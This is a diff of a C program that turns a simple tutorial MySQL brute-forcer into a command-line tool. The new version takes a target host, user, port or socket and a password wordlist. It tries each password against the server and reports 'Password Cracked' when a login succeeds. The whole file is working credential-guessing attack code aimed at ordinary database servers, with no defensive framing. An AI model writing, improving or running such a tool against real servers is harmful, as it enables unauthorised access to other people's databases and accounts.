@@ -1,68 +1,111 @@
-// Tutorial > Criando programa simples para brute-force em C
-// By: MMxM [ hc0der.blogspot.com ]
+// gcc brute_mysql.c -o brute-mysql $(mysql_config --libs --cflags)
 
-#include <stdio.h>
 #include <mysql/mysql.h>
-#define host "localhost"
-#define user "root"
-#define wl "wordlist.txt"
+#include <stdio.h>
+#include <string.h>
+#include <getopt.h>
+#include <stdlib.h>
 
-int mysql_brute(const char *pass){
-	MYSQL con;
-	mysql_init(&con);
-	int check = (int)mysql_real_connect(&con,host,user,pass,NULL,0,NULL,0);
-	if(check != 0){
-		mysql_close(&con);
-		return(1);
-	}
-	return(0);
+struct options {
+    char *hostname;
+    char *user;
+    unsigned int port;
+    char *unix_socket;
+    char *wordlist;
+} opts;
+
+int mysql_brute(const char *password){
+    int ret = 0;
+    MYSQL con;
+
+    mysql_init(&con);
+
+    if(mysql_real_connect(&con, opts.hostname, opts.user, password,
+            NULL, opts.port, opts.unix_socket, 0)){
+        ret = 1;
+    }
+
+    mysql_close(&con);
+
+    return ret;
 }
 
-void GetParameters(FILE *arquivo,unsigned int *max,unsigned int *lines){
-	char C;
-	unsigned int x = 0,y = 0,aux = 0;
+void help(void){
+    const char *banner=
+        "brute-mysql [OPTIONS] [HOSTNAME]\n\n"
+        "Options:\n"
+        " -u STRING          Username\n"
+        " -p NUMBER          Port number\n"
+        " -U FILE            Connect through unix domain socket\n"
+        " -w FILE            Password wordlist";
 
-	while( (C = fgetc(arquivo)) != EOF ){
-		if(C == '\n'){
-			if(aux > x) x = aux;
-			aux = 0;
-			y++;
-		}
-		aux++;
-	}
-
-	*max = x;
-	*lines = y;
-	fseek(arquivo,0,SEEK_SET);
-	return;
+    puts(banner);
+    exit(0);
 }
 
-int main(void){
-	FILE *wordlist;
-	wordlist = fopen(wl,"r");
-	if(wordlist == NULL) return(-1);
-	unsigned int Maxlen = 0,NumberOfLines = 0,pos = 0;
-	GetParameters(wordlist,&Maxlen,&NumberOfLines);
 
-	char Password[Maxlen];
-	char C;
+int main(int argc, char **argv){
+    ssize_t n;
+    FILE *fh;
+    int opt;
 
-	while ( (C=fgetc(wordlist)) != EOF ){
-		if(C=='\n'){
-			Password[pos] = '\0';
-			pos = 0;
-			printf("Testando: %s\n",Password);
-			if(mysql_brute(Password)){
-				printf("\n\n\tPassword Cracked: %s\n\n",Password);
-				break;
-			}
-		} else {
-			Password[pos] = C;
-			pos++;
-		}
-	}
+    memset(&opts, 0x0, sizeof(opts));
 
-	printf("__END__\n\n");
 
-	return 0;
+    while((opt = getopt(argc, argv, "u:U:p:w:")) != -1){
+        switch(opt){
+            case 'u':
+                opts.user = optarg;
+                break;
+            case 'U':
+                opts.unix_socket = optarg;
+                break;
+            case 'p':
+                opts.port = atoi(optarg);
+                break;
+            case 'w':
+                opts.wordlist = optarg;
+                break;
+            default:
+                return 1;
+        }
+    }
+
+    opts.hostname = argv[optind];
+
+    if(!opts.wordlist || !opts.user ||
+        (!opts.hostname && !opts.unix_socket)){
+        help();
+    }
+
+
+    fh = fopen(opts.wordlist, "r");
+    if(fh == NULL){
+        perror("fopen()");
+        return 1;
+    }
+
+    char *line = NULL;
+    size_t len = 0;
+
+    while((n = getline(&line, &len, fh)) > 0){
+        // skip blank lines
+        if(n == 1 && line[0] == '\n'){
+            continue;
+        }
+
+        // chomp
+        if(line[n-1] == '\n'){
+            line[n-1] = 0x0;
+        }
+
+        printf("trying: %s\n", line);
+
+        if(mysql_brute(line)){
+            printf("\n\n\tPassword Cracked: %s\n\n", line);
+            break;
+        }
+    }
+
+    return 0;
 }
